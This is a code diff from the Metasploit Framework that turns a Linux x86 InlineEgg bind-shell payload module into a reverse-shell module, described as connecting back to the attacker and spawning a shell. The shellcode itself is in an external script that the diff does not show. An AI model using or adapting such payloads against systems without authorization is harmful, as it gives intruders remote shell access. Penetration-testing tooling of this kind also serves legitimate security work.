@@ -7,19 +7,19 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::linx86_bind_ie;
+package Msf::Payload::linux_ia32_reverse_ie;
 use strict;
 use base 'Msf::PayloadComponent::InlineEggPayload';
 sub _Load {
-  Msf::PayloadComponent::InlineEggPayload->_Import('Msf::PayloadComponent::BindConnection');
+  Msf::PayloadComponent::InlineEggPayload->_Import('Msf::PayloadComponent::ReverseConnection');
   __PACKAGE__->SUPER::_Load();
 }
 
 my $info =
 {
-  'Name'         => 'Linux InlineEgg Bind Shell',
+  'Name'         => 'Linux IA32 InlineEgg Reverse Shell',
   'Version'      => '$Revision$',
-  'Description'  => 'Listen for connection and spawn a shell',
+  'Description'  => 'Connect back to attacker and spawn a shell',
   'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
   'Arch'         => [ 'x86' ],
   'Priv'         => 0,
@@ -34,14 +34,14 @@ sub new {
   $hash = $class->MergeHashRec($hash, {'Info' => $info});
   my $self = $class->SUPER::new($hash, @_);
 
-  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86bind_ie.py';
+  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86reverse_ie.py';
   $self->_Info->{'Size'} = $self->_GenSize;
   return($self);
 }
 
 sub _GenSize {
   my $self = shift;
-  my $bin = $self->Generate({'LPORT' => '4444',});
+  my $bin = $self->Generate({'LHOST' => '127.0.0.1', 'LPORT' => '4444',});
   return(length($bin));
 }
 
